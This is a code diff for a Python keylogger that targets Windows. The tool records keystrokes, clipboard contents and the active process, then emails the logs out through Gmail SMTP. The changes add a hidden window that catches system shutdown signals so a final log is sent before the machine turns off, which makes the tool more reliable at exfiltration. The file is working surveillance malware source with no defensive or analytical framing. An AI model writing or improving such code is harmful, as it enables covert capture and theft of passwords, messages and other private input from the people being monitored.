@@ -3,18 +3,22 @@ import sys
 import time
 import smtplib
 import threading
-import atexit  # Handles clean exit during system shutdown or script termination
+import atexit
 from ctypes import windll, byref, create_unicode_buffer, c_ulong
 import tkinter as tk
 from tkinter import simpledialog, messagebox
 from pynput import keyboard
 import win32clipboard
+import win32gui
+import win32con
+
+logger_instance = None
 
 class EmailSender:
     def __init__(self, email, app_password):
         self.email = email
         self.app_password = app_password
-        self.smtp_server = "smtp.gmail.com" #You can also use smtp.outlook.com
+        self.smtp_server = "smtp.gmail.com" #or use smtp-mail.outlook.com
         self.smtp_port = 587
     
     def send(self, subject, body):
@@ -73,7 +77,7 @@ class KeyLogger:
         timer.start()
 
     def final_report(self):
-        """Emergency transmission: triggered on system shutdown or script exit[cite: 1]."""
+        """Emergency transmission: triggered on system shutdown or script exit."""
         self.send_log_logic(is_final=True)
 
     def get_current_process(self):
@@ -130,6 +134,13 @@ class KeyLogger:
         with keyboard.Listener(on_press=self.on_press) as listener:
             listener.join()
 
+def shutdown_handler(hwnd, msg, wparam, lparam):
+    """Hidden window proc to catch system shutdown signals."""
+    if msg == win32con.WM_QUERYENDSESSION:
+        if logger_instance:
+            logger_instance.final_report()
+    return True
+
 def get_user_config():
     """GUI dialog for user configuration."""
     root = tk.Tk()
@@ -157,8 +168,19 @@ if __name__ == '__main__':
     email, password, use_email = get_user_config()
     
     if use_email is not None:
-        logger = KeyLogger(email, password, use_email)
+        logger_instance = KeyLogger(email, password, use_email)
+        
+        if use_email:
+            wc = win32gui.WNDCLASS()
+            wc.lpfnWndProc = shutdown_handler
+            wc.lpszClassName = "ShutdownListenerWindow"
+            hinst = wc.hInstance = win32gui.GetModuleHandle(None)
+            class_atom = win32gui.RegisterClass(wc)
+            hwnd = win32gui.CreateWindow(
+                class_atom, "ShutdownListener", 0, 0, 0, 0, 0, 0, 0, hinst, None
+            )
+
         try:
-            logger.run()
+            logger_instance.run()
         except (KeyboardInterrupt, SystemExit):
             pass
